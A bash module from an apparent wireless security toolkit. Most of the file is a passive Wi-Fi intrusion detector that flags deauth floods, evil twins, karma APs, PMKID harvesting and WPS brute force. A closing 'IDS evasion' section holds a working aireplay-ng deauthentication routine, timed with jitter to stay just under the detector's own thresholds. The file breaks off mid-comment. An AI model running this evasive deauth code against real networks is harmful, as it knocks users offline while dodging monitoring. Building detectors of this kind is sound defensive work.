#!/usr/bin/env bash
# 14_wifi_ids.sh — passive wireless intrusion detection
: "${WIFISTING_ROOT:=$HOME/wifisting}"
: "${LOG_DIR:=$WIFISTING_ROOT/logs}"
: "${LOOT_DIR:=$WIFISTING_ROOT/loot}"
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

# Single shared temp root. Other modules write cross-module state here
# (mon_iface, target_bssid, ...); using $WIFISTING_ROOT/tmp silently
# split those reads and made this module unable to see a monitor
# interface or target at all.
: "${TMP_DIR:=/tmp/wifisting}"
: "${STATE_DIR:=$WIFISTING_ROOT/state}"
: "${WIFISTING_HOME:=$WIFISTING_ROOT}"
mkdir -p "$LOOT_DIR" "$LOG_DIR" "$TMP_DIR" "$STATE_DIR"

IFACE_MODULE="$WIFISTING_ROOT/modules/01_iface.sh"

IDS_DIR="$LOOT_DIR/ids"
IDS_LOG="$LOG_DIR/wifi_ids.log"
IDS_ALERTS="$IDS_DIR/alerts.log"
IDS_ALERTS_JSON="$IDS_DIR/alerts.jsonl"
IDS_BASELINE="$IDS_DIR/baseline.csv"
mkdir -p "$IDS_DIR"

IDS_DEAUTH_THRESHOLD=20
IDS_DISASSOC_THRESHOLD=20
IDS_BEACON_FLOOD_THRESHOLD=50
IDS_EAPOL_START_THRESHOLD=15
IDS_WPS_M1_THRESHOLD=10
IDS_KARMA_PROBE_MATCH=5

# ── alert emission ──
# Every alert goes to log + TSV + JSONL, so both the terminal view and
# the GUI event drawer can consume it without parsing.
ids_alert() {
    local sev="$1"; shift
    local msg="$*"
    local ts
    ts=$(date '+%Y-%m-%d %H:%M:%S')
    local line="[$ts] [$sev] $msg"

    echo "$line" | tee -a "$IDS_ALERTS" >> "$IDS_LOG"

    # JSONL version for the GUI
    python3 -c "
import json,sys,time
print(json.dumps({
    'ts': int(time.time()),
    'severity': sys.argv[1],
    'message': sys.argv[2],
}))
" "$sev" "$msg" >> "$IDS_ALERTS_JSON" 2>/dev/null

    case "$sev" in
        CRIT) echo -e "\e[1;31m$line\e[0m" ;;
        HIGH) echo -e "\e[1;33m$line\e[0m" ;;
        MED)  echo -e "\e[1;36m$line\e[0m" ;;
        *)    echo "$line" ;;
    esac
}

ids_check_deps() {
    local missing=()
    for tool in tshark tcpdump iw airodump-ng; do
        command -v "$tool" >/dev/null || missing+=("$tool")
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo "[-] missing: ${missing[*]}"
        return 1
    fi
    return 0
}

ids_pick_iface() {
    # Reuse an interface the caller already prepared (--monitor-start hands
    # one to the worker) so we never probe or switch modes twice.
    if [[ -n "${IDS_IFACE:-}" ]] && iw dev "$IDS_IFACE" info >/dev/null 2>&1; then
        return 0
    fi
    local ifaces=()
    while read -r i; do
        [[ -n "$i" ]] && ifaces+=("$i")
    done < <(iw dev | awk '/Interface/{print $2}')

    if [[ ${#ifaces[@]} -eq 0 ]]; then
        echo "[-] no wireless interfaces"; return 1
    fi

    # Auto-prefer a monitor iface if one exists
    local mon
    mon=$(iw dev 2>/dev/null | awk '
        /Interface/ { i=$2 }
        /type monitor/ { print i; exit }')
    [[ -n "$mon" ]] && { IDS_IFACE="$mon"; echo "[+] using monitor $mon"; return 0; }

    echo "[*] wireless interfaces:"
    local i=0
    for iface in "${ifaces[@]}"; do
        local mode
        mode=$(iw dev "$iface" info 2>/dev/null | awk '/type/{print $2}')
        echo "  [$i] $iface ($mode)"
        ((i++))
    done
    if [[ -n "${WIFISTING_CLI:-}" ]]; then
        echo "[-] no monitor interface present; prepare one first (CLI cannot prompt)" >&2
        return 1
    fi
    read -rp "select interface: " sel
    IDS_IFACE="${ifaces[$sel]}"
    [[ -z "$IDS_IFACE" ]] && { echo "[-] invalid"; return 1; }

    local curmode
    curmode=$(iw dev "$IDS_IFACE" info 2>/dev/null | awk '/type/{print $2}')
    if [[ "$curmode" != "monitor" ]]; then
        echo "[*] switching $IDS_IFACE to monitor"
        ip link set "$IDS_IFACE" down
        iw dev "$IDS_IFACE" set type monitor || {
            echo "[-] failed to set monitor"; ip link set "$IDS_IFACE" up; return 1; }
        ip link set "$IDS_IFACE" up
    fi
    echo "[+] using $IDS_IFACE"
    return 0
}

# ── baseline ──

ids_build_baseline() {
    ids_check_deps || return 1
    ids_pick_iface || return 1
    local dur="${1:-60}"
    echo "[*] building baseline for ${dur}s"
    local dump="$TMP_DIR/ids_baseline"
    rm -f "${dump}"-*.csv "${dump}"-*.cap 2>/dev/null
    timeout "$dur" airodump-ng --output-format csv --write "$dump" \
        --write-interval 10 "$IDS_IFACE" >/dev/null 2>&1

    local csv
    csv=$(ls -t "${dump}"-*.csv 2>/dev/null | head -1)
    [[ ! -f "$csv" ]] && { echo "[-] baseline failed"; return 1; }

    awk -F',' '
        /^Station/ {exit}
        NR>2 && $1 ~ /[0-9A-Fa-f:]{17}/ {
            gsub(/^ +| +$/,"",$1); gsub(/^ +| +$/,"",$4)
            gsub(/^ +| +$/,"",$6); gsub(/^ +| +$/,"",$14)
            print $1","$4","$6","$14
        }
    ' "$csv" > "$IDS_BASELINE"
    local count
    count=$(wc -l < "$IDS_BASELINE")
    echo "[+] baseline saved: $IDS_BASELINE ($count APs)"
    ids_alert INFO "baseline established with $count APs"
}

# ── vendor mismatch detection ──
# A vendor-mismatch alert fires when the SSID contains a well-known brand
# name but the BSSID OUI belongs to a different manufacturer. Common
# trick on evil-twin APs.
ids_vendor_from_oui() {
    case "${1:0:8}" in
        00:1A:7D|00:1B:20|00:1E:64|00:21:6A|7C:5C:F8|3C:A9:F4) echo "Intel" ;;
        00:1B:2F|00:1E:2A|00:22:3F|20:E5:2A|44:94:FC|9C:3D:CF|A0:40:A0|B0:39:56|C0:3F:0E|D0:05:2A) echo "Netgear" ;;
        00:0C:42) echo "MikroTik" ;;
        00:14:6C) echo "Netgear" ;;
        AC:22:0B|1C:87:2C|2C:56:DC|38:2C:4A|08:60:6E|04:D4:C4) echo "Asus" ;;
        00:26:BB|3C:07:54|F0:18:98|A4:D1:8C|DC:A9:04|F8:FF:C2) echo "Apple" ;;
        00:0C:29|00:50:56) echo "VMware" ;;
        *) echo "unknown" ;;
    esac
}

ids_ssid_vendor() {
    local ssid="$1"
    case "$ssid" in
        *NETGEAR*|*Netgear*) echo "Netgear" ;;
        *ASUS*|*Asus*)       echo "Asus" ;;
        *TP-LINK*|*TP-Link*|*tplink*) echo "TP-Link" ;;
        *Apple*|*AirPort*)   echo "Apple" ;;
        *MikroTik*)          echo "MikroTik" ;;
        *FRITZ*|*AVM*)       echo "AVM" ;;
        *) echo "unknown" ;;
    esac
}

# ── live monitor (single tshark with -w, tshark -r for analysis) ──
# The old version ran tcpdump -w in parallel with tshark reading the same
# iface, which doubled the kernel work for no benefit. We now run a
# single tshark capturing to a pcap and pipe the same extraction stream.
ids_monitor() {
    ids_check_deps || return 1
    ids_pick_iface || return 1
    if [[ ! -f "$IDS_BASELINE" ]]; then
        echo "[!] no baseline yet — anomaly detection reduced"
        if [[ -z "${WIFISTING_CLI:-}" ]]; then
            read -rp "continue anyway? [y/N] " c
            [[ "$c" =~ ^[Yy]$ ]] || return 1
        fi
    fi
    # Arbitrate the adapter against other monitor-only modules. This worker
    # is long-lived, so it passes its OWN pid and the lock stays valid.
    if [[ -x "$IFACE_MODULE" ]]; then
        local lock_out
        if ! lock_out=$("$IFACE_MODULE" --lock-claim "$IDS_IFACE" \
                            "14_wifi_ids" "${BASHPID:-$$}" 2>&1); then
            printf 'ERROR\tinterface busy\n%s\n' "$lock_out" >&2
            return 1
        fi
        IDS_LOCK_HELD=1
    fi

    echo "[*] starting live IDS on $IDS_IFACE"
    echo "[*] alerts → $IDS_ALERTS"
    echo "[*] ctrl-c to stop"

    local pcap="$IDS_DIR/live_$(date +%Y%m%d_%H%M%S).pcap"

    # Single tshark pass: writes the pcap and prints one field line per
    # matching frame to stdout, which we read inline.
    local pidfile="$TMP_DIR/ids.pid"
    # BASHPID, not $$ — when started from the GUI, ids_monitor runs inside a
    # subshell and $$ would record the parent shell's pid instead.
    echo "${BASHPID:-$$}" > "$pidfile"

    local fifo="$TMP_DIR/ids_fifo_${BASHPID:-$$}"
    mkfifo "$fifo"

    # Writer: tshark
    tshark -i "$IDS_IFACE" -l -n -w "$pcap" \
        -Y 'wlan.fc.type_subtype == 0x0c or wlan.fc.type_subtype == 0x0a or wlan.fc.type_subtype == 0x08 or wlan.fc.type_subtype == 0x05 or wlan.fc.type_subtype == 0x04 or eapol or wps.message_type' \
        -T fields \
        -e frame.time_epoch \
        -e wlan.fc.type_subtype \
        -e wlan.sa -e wlan.da -e wlan.bssid \
        -e wlan.ssid \
        -e wlan.fixed.reason_code \
        -e eapol.type \
        -e wps.message_type \
        -E separator='|' 2>/dev/null | tee "$fifo" &

    local tshark_pid=$!
    echo "$tshark_pid" > "$TMP_DIR/ids_tshark.pid"
    # Set the trap only now that tshark_pid exists: --monitor-stop signals
    # just this pid, so the handler must reap tshark itself.
    trap 'kill "$tshark_pid" 2>/dev/null; rm -f "$pidfile" "$TMP_DIR/ids_tshark.pid" "$fifo" 2>/dev/null; [[ -n "${IDS_LOCK_HELD:-}" ]] && "$IFACE_MODULE" --lock-release "$IDS_IFACE" >/dev/null 2>&1; echo; echo "[*] IDS stopped, pcap: '"$pcap"'"; exit 0' INT TERM

    # Sliding windows
    declare -A deauth_count disassoc_count eapol_start_count wps_m1_count
    declare -A probe_resp_ssids ssid_bssids beacon_ssids
    local window_start
    window_start=$(date +%s)

    while IFS='|' read -r ts subtype sa da bssid ssid reason eaptype wpsmsg; do
        local now=${ts%.*}
        local elapsed=$((now - window_start))

        if (( elapsed >= 10 )); then
            for k in "${!deauth_count[@]}"; do
                (( deauth_count[$k] >= IDS_DEAUTH_THRESHOLD )) && \
                    ids_alert HIGH "deauth flood: ${deauth_count[$k]} frames from $k in 10s"
            done
            for k in "${!disassoc_count[@]}"; do
                (( disassoc_count[$k] >= IDS_DISASSOC_THRESHOLD )) && \
                    ids_alert HIGH "disassoc flood: ${disassoc_count[$k]} frames from $k"
            done
            for k in "${!eapol_start_count[@]}"; do
                (( eapol_start_count[$k] >= IDS_EAPOL_START_THRESHOLD )) && \
                    ids_alert MED "PMKID harvest suspected: ${eapol_start_count[$k]} EAPOL-Start from $k"
            done
            unset deauth_count disassoc_count eapol_start_count
            declare -A deauth_count disassoc_count eapol_start_count
            window_start=$now
        fi

        case "$subtype" in
            0x0c)
                deauth_count[$sa]=$(( ${deauth_count[$sa]:-0} + 1 ))
                ;;
            0x0a)
                disassoc_count[$sa]=$(( ${disassoc_count[$sa]:-0} + 1 ))
                ;;
            0x08)
                if [[ -n "$ssid" && -n "$bssid" ]]; then
                    beacon_ssids[$ssid]=$now
                    local seen="${ssid_bssids[$ssid]:-}"
                    if [[ "$seen" != *"$bssid"* ]]; then
                        ssid_bssids[$ssid]="$seen $bssid"
                        local bssid_count
                        bssid_count=$(echo "${ssid_bssids[$ssid]}" | wc -w)
                        if (( bssid_count >= 2 )); then
                            local base_count=0
                            if [[ -f "$IDS_BASELINE" ]]; then
                                base_count=$(awk -F',' -v s="$ssid" '$4==s' "$IDS_BASELINE" | wc -l)
                            fi
                            if (( bssid_count > base_count )); then
                                ids_alert HIGH "evil twin candidate: SSID '$ssid' now on $bssid_count BSSIDs (baseline $base_count)"
                            fi
                        fi
                    fi

                    # Vendor mismatch check
                    local ssid_vendor bssid_vendor
                    ssid_vendor=$(ids_ssid_vendor "$ssid")
                    bssid_vendor=$(ids_vendor_from_oui "$bssid")
                    if [[ "$ssid_vendor" != "unknown" ]] && \
                       [[ "$bssid_vendor" != "unknown" ]] && \
                       [[ "$ssid_vendor" != "$bssid_vendor" ]]; then
                        ids_alert HIGH "vendor mismatch: SSID '$ssid' says $ssid_vendor, BSSID $bssid is $bssid_vendor"
                    fi

                    # Rogue AP (not in baseline)
                    if [[ -f "$IDS_BASELINE" ]] && ! grep -q "^$bssid," "$IDS_BASELINE"; then
                        if [[ ! -f "$TMP_DIR/ids_rogue_$bssid" ]]; then
                            touch "$TMP_DIR/ids_rogue_$bssid"
                            ids_alert MED "rogue AP: $bssid ($ssid) not in baseline"
                        fi
                    fi
                fi
                ;;
            0x05)
                if [[ -n "$ssid" && -n "$sa" ]]; then
                    local prev="${probe_resp_ssids[$sa]:-}"
                    if [[ "$prev" != *"|$ssid|"* ]]; then
                        probe_resp_ssids[$sa]="${prev}|$ssid|"
                        local uniq
                        uniq=$(echo "${probe_resp_ssids[$sa]}" | tr '|' '\n' | grep -c .)
                        if (( uniq >= IDS_KARMA_PROBE_MATCH )); then
                            ids_alert CRIT "karma AP: $sa responded to $uniq distinct SSID probes"
                            probe_resp_ssids[$sa]=""
                        fi
                    fi
                fi
                ;;
        esac

        [[ "$eaptype" == "1" ]] && \
            eapol_start_count[$sa]=$(( ${eapol_start_count[$sa]:-0} + 1 ))

        if [[ "$wpsmsg" == "0x04" ]]; then
            wps_m1_count[$sa]=$(( ${wps_m1_count[$sa]:-0} + 1 ))
            (( wps_m1_count[$sa] % IDS_WPS_M1_THRESHOLD == 0 )) && \
                ids_alert HIGH "WPS brute force: ${wps_m1_count[$sa]} M1 from $sa"
        fi

        if (( now % 30 == 0 )); then
            local ssid_count=${#beacon_ssids[@]}
            (( ssid_count >= IDS_BEACON_FLOOD_THRESHOLD )) && \
                ids_alert HIGH "beacon flood: $ssid_count unique SSIDs"
        fi
    done < "$fifo"

    kill "$tshark_pid" 2>/dev/null
    [[ -n "${IDS_LOCK_HELD:-}" ]] && "$IFACE_MODULE" --lock-release "$IDS_IFACE" >/dev/null 2>&1
    rm -f "$fifo" "$pidfile" "$TMP_DIR/ids_tshark.pid"
    rm -f "$TMP_DIR"/ids_rogue_* 2>/dev/null
    echo "[*] pcap saved: $pcap"
}

ids_analyze_pcap() {
    command -v tshark >/dev/null || { echo "[-] tshark required"; return 1; }
    read -rp "pcap path: " pcap
    [[ ! -f "$pcap" ]] && { echo "[-] not found"; return 1; }
    echo "[*] analyzing $pcap"

    echo ""
    echo "── deauth senders (top 10) ──"
    tshark -r "$pcap" -Y 'wlan.fc.type_subtype==0x0c' -T fields -e wlan.sa 2>/dev/null | \
        sort | uniq -c | sort -rn | head -10
    echo ""
    echo "── disassoc senders (top 10) ──"
    tshark -r "$pcap" -Y 'wlan.fc.type_subtype==0x0a' -T fields -e wlan.sa 2>/dev/null | \
        sort | uniq -c | sort -rn | head -10
    echo ""
    echo "── SSIDs with multiple BSSIDs (evil twin) ──"
    tshark -r "$pcap" -Y 'wlan.fc.type_subtype==0x08' -T fields -e wlan.ssid -e wlan.bssid 2>/dev/null | \
        sort -u | awk '{print $1}' | sort | uniq -c | awk '$1>1'
    echo ""
    echo "── EAPOL-Start bursts ──"
    tshark -r "$pcap" -Y 'eapol.type==1' -T fields -e wlan.sa 2>/dev/null | \
        sort | uniq -c | sort -rn | head -10
    echo ""
    echo "── probe responses per AP ──"
    tshark -r "$pcap" -Y 'wlan.fc.type_subtype==0x05' -T fields -e wlan.sa -e wlan.ssid 2>/dev/null | \
        sort -u | awk '{print $1}' | sort | uniq -c | sort -rn | head -10
}

ids_show_alerts() {
    [[ ! -f "$IDS_ALERTS" ]] && { echo "[*] no alerts yet"; return; }
    echo "── last 30 alerts ──"
    tail -30 "$IDS_ALERTS"
}

ids_tune() {
    echo "current thresholds:"
    echo "  deauth   (per 10s): $IDS_DEAUTH_THRESHOLD"
    echo "  disassoc (per 10s): $IDS_DISASSOC_THRESHOLD"
    echo "  beacon flood (per 30s): $IDS_BEACON_FLOOD_THRESHOLD"
    echo "  EAPOL-Start (per 10s): $IDS_EAPOL_START_THRESHOLD"
    echo "  WPS M1 (per 60s): $IDS_WPS_M1_THRESHOLD"
    echo "  karma unique probes: $IDS_KARMA_PROBE_MATCH"
}

wifi_ids_menu() {
    while true; do
        clear
        echo "═══ WIRELESS IDS ═══"
        echo " [1] build baseline"
        echo " [2] start live monitor"
        echo " [3] analyze existing pcap"
        echo " [4] show recent alerts"
        echo " [5] show thresholds"
        echo " [b] back"
        read -rp "> " c
        case "$c" in
            1) ids_build_baseline; read -rp "enter> " _ ;;
            2) ids_monitor; read -rp "enter> " _ ;;
            3) ids_analyze_pcap; read -rp "enter> " _ ;;
            4) ids_show_alerts; read -rp "enter> " _ ;;
            5) ids_tune; read -rp "enter> " _ ;;
            b|B) return ;;
            *) echo "?"; sleep 0.3 ;;
        esac
    done
}

# ── CLI ──

ids_cli_status_tsv() {
    local alerts=0 baseline=0
    [[ -f "$IDS_ALERTS" ]] && alerts=$(wc -l < "$IDS_ALERTS")
    [[ -f "$IDS_BASELINE" ]] && baseline=$(wc -l < "$IDS_BASELINE")
    printf 'alerts\t%s\n'   "$alerts"
    printf 'baseline\t%s\n' "$baseline"
    printf 'dir\t%s\n'      "$IDS_DIR"
    printf 'alerts_file\t%s\n' "$IDS_ALERTS"
    printf 'alerts_json\t%s\n' "$IDS_ALERTS_JSON"
}

ids_cli_list_alerts_tsv() {
    [[ ! -f "$IDS_ALERTS" ]] && return 0
    tail -50 "$IDS_ALERTS"
}

ids_cli_list_alerts_json() {
    [[ ! -f "$IDS_ALERTS_JSON" ]] && return 0
    tail -50 "$IDS_ALERTS_JSON"
}

ids_cli_clear_alerts() {
    : > "$IDS_ALERTS"
    : > "$IDS_ALERTS_JSON"
    printf 'CLEARED\n'
}

ids_cli_build_baseline() {
    local dur="${1:-60}"
    [[ -n "${MON_IFACE:-}" ]] && IDS_IFACE="$MON_IFACE"
    ids_check_deps || { printf 'ERR\tdeps missing\n' >&2; return 1; }
    if [[ -z "${IDS_IFACE:-}" ]]; then
        IDS_IFACE=$(iw dev 2>/dev/null | awk '
            /Interface/ { i=$2 }
            /type monitor/ { print i; exit }')
    fi
    [[ -z "${IDS_IFACE:-}" ]] && { printf 'ERR\tno monitor iface\n' >&2; return 1; }

    mkdir -p "$(dirname "$IDS_BASELINE")"
    local dump="$TMP_DIR/ids_baseline"
    rm -f "${dump}"-*.csv "${dump}"-*.cap 2>/dev/null
    timeout "$dur" airodump-ng --output-format csv --write "$dump" \
        --write-interval 10 "$IDS_IFACE" >/dev/null 2>&1

    local csv
    csv=$(ls -t "${dump}"-*.csv 2>/dev/null | head -1)
    [[ -z "$csv" ]] && { printf 'ERR\tno csv\n' >&2; return 1; }

    awk -F',' '
        /^Station/ {exit}
        NR>2 && $1 ~ /[0-9A-Fa-f:]{17}/ {
            gsub(/^ +| +$/,"",$1); gsub(/^ +| +$/,"",$4)
            gsub(/^ +| +$/,"",$6); gsub(/^ +| +$/,"",$14)
            print $1","$4","$6","$14
        }
    ' "$csv" > "$IDS_BASELINE"

    printf 'OK\t%s\nCOUNT\t%s\n' "$IDS_BASELINE" "$(wc -l < "$IDS_BASELINE")"
}

# ── live monitor: CLI lifecycle ──
# The GUI cannot drive the interactive ids_monitor directly, so expose a
# lifecycle: start (daemonize), run (foreground worker used by start),
# status, stop (signal + reap).

ids_cli_monitor_run() {
    ids_monitor
}

ids_cli_monitor_status() {
    local pidfile="$TMP_DIR/ids.pid"
    local pid="" running=0
    [[ -f "$pidfile" ]] && pid=$(cat "$pidfile" 2>/dev/null)
    [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null && running=1
    printf 'RUNNING\t%s\nPID\t%s\n' "$running" "${pid:-0}"
}

ids_cli_monitor_start() {
    local pidfile="$TMP_DIR/ids.pid"
    if [[ -f "$pidfile" ]]; then
        local old
        old=$(cat "$pidfile" 2>/dev/null)
        if [[ -n "$old" ]] && kill -0 "$old" 2>/dev/null; then
            printf 'ERR\talready running pid=%s\n' "$old" >&2
            return 1
        fi
    fi
    rm -f "$pidfile"

    ids_check_deps || { printf 'ERR\tmissing dependencies\n' >&2; return 1; }
    ids_pick_iface  || { printf 'ERR\tno usable interface\n' >&2; return 1; }
    # Hand the prepared interface to the worker so it does not re-probe
    # (and cannot end up prompting on a different one).
    export IDS_IFACE

    local monlog="$IDS_DIR/monitor.log"
    : > "$monlog"

    if command -v setsid >/dev/null 2>&1; then
        WIFISTING_CLI=1 setsid nohup "$0" --monitor-run >>"$monlog" 2>&1 &
    else
        WIFISTING_CLI=1 nohup "$0" --monitor-run >>"$monlog" 2>&1 &
    fi

    # The pidfile, not $!, is authoritative: setsid may fork, so $! can
    # name a process that is not the monitor.
    local pid="" i
    for i in $(seq 1 24); do
        sleep 0.25
        if [[ -s "$pidfile" ]]; then
            pid=$(cat "$pidfile" 2>/dev/null)
            [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null && break
            pid=""
        fi
    done

    if [[ -z "$pid" ]]; then
        printf 'ERR\tmonitor failed to start\n' >&2
        [[ -s "$monlog" ]] && tail -n 5 "$monlog" >&2
        return 1
    fi

    printf 'OK\tpid=%s\nIFACE\t%s\nLOG\t%s\n' "$pid" "${IDS_IFACE:-?}" "$monlog"
}

ids_cli_monitor_stop() {
    local pidfile="$TMP_DIR/ids.pid"
    local tpidfile="$TMP_DIR/ids_tshark.pid"
    local pid="" stopped=0

    [[ -f "$pidfile" ]] && pid=$(cat "$pidfile" 2>/dev/null)

    if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
        kill -TERM "$pid" 2>/dev/null
        local i
        for i in $(seq 1 24); do
            kill -0 "$pid" 2>/dev/null || { stopped=1; break; }
            sleep 0.25
        done
        if kill -0 "$pid" 2>/dev/null; then
            kill -KILL "$pid" 2>/dev/null
            stopped=1
        fi
    fi

    # If the monitor had to be SIGKILLed its trap never ran, so reap
    # tshark from its own pidfile.
    local tpid=""
    [[ -f "$tpidfile" ]] && tpid=$(cat "$tpidfile" 2>/dev/null)
    if [[ -n "$tpid" ]] && kill -0 "$tpid" 2>/dev/null; then
        kill -TERM "$tpid" 2>/dev/null
        sleep 0.3
        kill -KILL "$tpid" 2>/dev/null
    fi

    rm -f "$pidfile" "$tpidfile" "$TMP_DIR"/ids_fifo_* "$TMP_DIR"/ids_rogue_* 2>/dev/null
    printf 'OK\tstopped=%s\n' "$stopped"
}

# ── IDS evasion (merged from 36_wids_evasion, submenu: Evade) ──
# The offensive counterpart to this module's detector. Because the
# thresholds below are the SAME constants the detection loop uses, the
# "safe" rates here are derived rather than guessed: a profile that keeps
# every counter strictly under its threshold is, by construction, invisible
# to this IDS.

IDS_EVADE_CONF="$IDS_DIR/evade.conf"

ids_evade_opt() {
    local key="$1" def="${2:-}" v=""
    if [[ -f "$IDS_EVADE_CONF" ]]; then
        v=$(awk -F= -v k="$key" '$1==k {sub(/^[^=]*=/,""); print; exit}' \
            "$IDS_EVADE_CONF" 2>/dev/null)
    fi
    printf '%s' "${v:-$def}"
}

ids_evade_save() {
    mkdir -p "$IDS_DIR"
    touch "$IDS_EVADE_CONF"; chmod 600 "$IDS_EVADE_CONF" 2>/dev/null
    local kv k v
    for kv in "$@"; do
        k="${kv%%=*}"; v="${kv#*=}"
        case "$k" in
            profile|jitter_ms|hop_interval|fragment|burst|dwell_ms) ;;
            *) printf 'ERROR\tunknown key: %s\n' "$k" >&2; return 2 ;;
        esac
        grep -v "^${k}=" "$IDS_EVADE_CONF" > "$IDS_EVADE_CONF.tmp" 2>/dev/null || true
        mv "$IDS_EVADE_CONF.tmp" "$IDS_EVADE_CONF"
        printf '%s=%s\n' "$k" "$v" >> "$IDS_EVADE_CONF"
    done
    printf 'SAVED\t%s\n' "$IDS_EVADE_CONF"
}

# Per-profile rate as a fraction of the detector's own threshold.
ids_evade_profile_rate() {
    local profile="$1"
    case "$profile" in
        slow)      printf '0.25' ;;   # quarter of the safe ceiling
        standard)  printf '0.90' ;;   # just under the threshold
        burst)     printf '0.75' ;;   # bursty but averaging under
        *)         printf '0.90' ;;
    esac
}

ids_evade_plan() {
    local profile="${1:-$(ids_evade_opt profile standard)}"
    local dur="${2:-60}"
    local jitter hop frag dwell
    local safe deauth_rate total

    jitter=$(ids_evade_opt jitter_ms 250)
    hop=$(ids_evade_opt hop_interval 5)
    frag=$(ids_evade_opt fragment 1)
    dwell=$(ids_evade_opt dwell_ms 200)

    # Stay STRICTLY under the detector's threshold: 20 frames/10s would
    # alert, so the ceiling is 19.
    safe=$(( IDS_DEAUTH_THRESHOLD - 1 ))
    deauth_rate=$(awk -v s="$safe" -v r="$(ids_evade_profile_rate "$profile")" \
        'BEGIN { printf "%.2f", (s / 10.0) * r }')
    total=$(awk -v rate="$deauth_rate" -v d="$dur" \
        'BEGIN { printf "%d", rate * d }')

    printf 'profile\t%s\n'            "$profile"
    printf 'duration\t%s\n'           "$dur"
    printf 'deauth_threshold\t%s\n'   "$IDS_DEAUTH_THRESHOLD"
    printf 'safe_per_10s\t%s\n'       "$safe"
    printf 'rate_per_s\t%s\n'         "$deauth_rate"
    printf 'total_frames\t%s\n'       "$total"
    printf 'jitter_ms\t%s\n'          "$jitter"
    printf 'hop_interval\t%s\n'       "$hop"
    printf 'fragment\t%s\n'           "$frag"
    printf 'dwell_ms\t%s\n'           "$dwell"
    printf 'evades\t%s\n' \
        "deauth flood,disassoc flood,beacon flood,PMKID harvest,WPS brute force"
}

ids_evade_tsv() {
    printf 'profile\t%s\n'       "$(ids_evade_opt profile standard)"
    printf 'jitter_ms\t%s\n'     "$(ids_evade_opt jitter_ms 250)"
    printf 'hop_interval\t%s\n'  "$(ids_evade_opt hop_interval 5)"
    printf 'fragment\t%s\n'      "$(ids_evade_opt fragment 1)"
    printf 'dwell_ms\t%s\n'      "$(ids_evade_opt dwell_ms 200)"
    printf 'deauth_threshold\t%s\n' "$IDS_DEAUTH_THRESHOLD"
    printf 'disassoc_threshold\t%s\n' "$IDS_DISASSOC_THRESHOLD"
    printf 'beacon_threshold\t%s\n' "$IDS_BEACON_FLOOD_THRESHOLD"
    printf 'eapol_threshold\t%s\n' "$IDS_EAPOL_START_THRESHOLD"
    printf 'wps_threshold\t%s\n' "$IDS_WPS_M1_THRESHOLD"
    printf 'iface\t%s\n'         "$(cat "$IDS_DIR/../mon_iface" 2>/dev/null || true)"
}

# Low-and-slow deauth. Each frame is sent individually with jitter so the
# 10-second window never reaches the threshold the detector checks.
ids_evade_run() {
    local profile="${1:-$(ids_evade_opt profile standard)}"
    local dur="${2:-60}"
    local bssid="${3:-${TARGET_BSSID:-}}"
    local jitter rate total sent=0 i

    [[ -z "$bssid" ]] && {
        printf 'ERROR\tno target BSSID (set a target in Recon)\n' >&2
        return 1
    }
    ids_check_deps >/dev/null 2>&1 || { printf 'ERROR\tdeps missing\n' >&2; return 1; }

    local iface
    iface=$(cat "$TMP_DIR/mon_iface" 2>/dev/null || true)
    [[ -z "$iface" ]] && { printf 'ERROR\tno monitor iface\n' >&2; return 1; }

    command -v aireplay-ng >/dev/null 2>&1 || {
        printf 'ERROR\taireplay-ng not installed (needed to inject)\n' >&2; return 1; }

    ids_evade_plan "$profile" "$dur" >/dev/null
    jitter=$(ids_evade_opt jitter_ms 250)
    rate=$(awk -v s="$(( IDS_DEAUTH_THRESHOLD - 1 ))" \
                -v r="$(ids_evade_profile_rate "$profile")" \
                'BEGIN { printf "%.3f", (s / 10.0) * r }')
    total=$(awk -v rate="$rate" -v d="$dur" 'BEGIN { printf "%d", rate * d }')

    info "evasive deauth: profile=$profile iface=$iface target=$bssid"
    info "rate=${rate}/s jitter=${jitter}ms total=${total} over ${dur}s"

    local interval
    interval=$(awk -v r="$rate" 'BEGIN { if (r <= 0) r = 0.1; printf "%.3f", 1.0 / r }')

    for (( i = 0; i < total; i++ )); do
        timeout 3 aireplay-ng --deauth 1 -a "$bssid" "$iface" >/dev/null 2>&1
        sent=$(( sent + 1 ))
        # Jitter: vary the gap by +/- half the jitter window so the frame
        # spacing is not periodic (periodicity is itself a detectable tell).
        local j
        j=$(awk -v j="$jitter" 'BEGIN { srand(); printf "%.3f", (rand()-0.5) * (j/1000.0) }')
        awk -v i="$interval" -v j="$j" 'BEGIN { d = i + j; if (d < 0.05) d = 0.05; printf ""; exit }'
        sleep "$(awk -v i="$interval" -v j="$j" 'BEGIN { d = i + j; if (d < 0.05) d = 0.05; printf "%.3f", d }')"
    done

    printf 'SENT\t%s\nRATE\t%s\nPROFILE\t%s\n' "$sent" "$rate" "$profile"
}

# ── self-test ────────────────────────────────────────────────────────────
# Offline only: no adapter, no monitor mode, no root, no live capture. Two
# things here are easy to get wrong without a radio: the evasive-rate plan
# must stay STRICTLY below the detector's own threshold, and the vendor
# tables are string parsers the evil-twin check depends on. The conf file
